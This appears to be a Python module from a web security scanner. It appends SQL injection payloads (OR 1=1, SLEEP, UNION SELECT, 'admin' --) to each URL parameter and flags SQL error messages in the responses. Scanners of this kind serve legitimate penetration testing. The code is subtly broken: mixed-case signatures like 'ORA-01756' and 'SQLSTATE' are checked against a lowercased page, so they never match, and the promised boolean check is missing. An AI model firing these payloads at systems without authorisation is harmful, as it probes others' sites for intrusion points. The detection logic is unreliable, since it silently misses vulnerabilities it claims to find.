
import logging
import urllib.parse
from typing import List, Dict, Any

# Common SQL Error Signatures
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "syntax error",
    "pg_query",
    "mysql_fetch",
    "ORA-01756",
    "SQLite3::query",
    "SQLSTATE"
]

# Robust Generic Payloads
SQLI_PAYLOADS = [
    "'", 
    "' OR '1'='1", 
    "' OR 1=1--",
    '" OR ""="', 
    "' OR SLEEP(5)--",
    "') OR ('1'='1",
    "' UNION SELECT 1,2,3--",
    "admin' --"
]

def run(url: str, session=None, debug: bool=False) -> List[Dict[str, Any]]:
    """
    Standalone robust SQLi scanner.
    Checks for Error-based and simple Boolean-based injections.
    """
    results: List[Dict[str, Any]] = []
    
    if not session:
        # Create dummy if missing (should not happen in flow)
        import requests
        session = requests.Session()

    parsed = urllib.parse.urlparse(url)
    q_params = urllib.parse.parse_qs(parsed.query)

    if not q_params:
        # No parameters to inject
        return results

    if debug:
        print(f"[SQLi] Scanning parameters for {url}...")

    # Iterate over each parameter
    for param, values in q_params.items():
        original_value = values[0]
        
        for payload in SQLI_PAYLOADS:
            # Construct injected URL
            new_query = q_params.copy()
            new_query[param] = [original_value + payload] # Append injection
            # Also try replacing
            
            injected_qs = urllib.parse.urlencode(new_query, doseq=True)
            target = urllib.parse.urlunparse(parsed._replace(query=injected_qs))
            
            try:
                # 1. Error Based Check
                resp = session.get(target, timeout=10)
                body_lower = resp.text.lower()
                
                for err in SQL_ERRORS:
                    if err in body_lower:
                        results.append({
                            "type": "SQLi (Error-Based)",
                            "parameter": param,
                            "payload": payload,
                            "evidence": {
                                "response_snippet": err,
                                "response_status": resp.status_code,
                                "request_url": target
                            },
                            "url": target,
                            "severity": "High"
                        })
                        if debug:
                            print(f"[!] SQLi Found: {param} with {payload}")
                        break
                
                # 2. Boolean/Logic Check (Simple)
                # Compare content length/status with baseline? (Omitted for speed in basics, but added if needed)
                
            except Exception as e:
                # Ignore connection errors
                pass

    return results

# Alias
scan = run
